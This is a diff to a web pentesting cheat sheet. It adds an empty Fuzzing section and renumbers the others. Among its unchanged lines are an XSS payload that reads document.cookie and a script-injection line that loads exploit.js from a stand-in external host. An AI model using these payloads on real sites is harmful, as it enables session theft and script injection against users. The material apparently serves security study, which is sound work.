@@ -7,11 +7,12 @@ Overview
 3. - [Online Resources](#3---online-resources)
 4. - [Browser Plugins](#4---browser-plugins)
 5. - [Web Reconnaissance](#5---web-reconnaissance)
-6. - [Sensitive Data Exposure](#6---sensitive-data-exposure)
-7. - [HTML Injection](#7---html-injection)
-8. - [Cross-Site Scripting (XSS)](#8---cross-site-scripting-xss)
-9. - [Cross-Site Request Forgery (CSRF)](#9---cross-site-request-forgery-csrf)
-10. - [Exploit Research](#10---exploit-research)
+6. - [Fuzzing](#6---fuzzing)
+7. - [Sensitive Data Exposure](#6---sensitive-data-exposure)
+8. - [HTML Injection](#7---html-injection)
+9. - [Cross-Site Scripting (XSS)](#8---cross-site-scripting-xss)
+10. - [Cross-Site Request Forgery (CSRF)](#9---cross-site-request-forgery-csrf)
+11. - [Exploit Research](#10---exploit-research)
 
    
 #1. - Web Requests
@@ -240,7 +241,10 @@ SpiderFoot
 OSINT Framework
 ```
 
-#6. - Sensitive Data Exposure
+#6. - Fuzzing
+-----------------------------------------
+
+#7. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -251,7 +255,7 @@ OR
 CTRL + U
 ```
 
-#7. - HTML Injection
+#8. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -260,7 +264,7 @@ CTRL + U
 <a href="http://www.google.com">Click Me</a>
 ```
 
-#8. - Cross-Site Scripting (XSS)
+#9. - Cross-Site Scripting (XSS)
 -----------------------------------------
 
 *Reflected XSS	= Occurs when user input is displayed on the page after processing (e.g., search result or error message).*
@@ -275,7 +279,7 @@ CTRL + U
 #"><img src=/ onerror=alert(document.cookie)>
 ```
 
-#9. - Cross-Site Request Forgery (CSRF)
+#10. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -284,7 +288,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#10. - Exploit Research
+#11. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
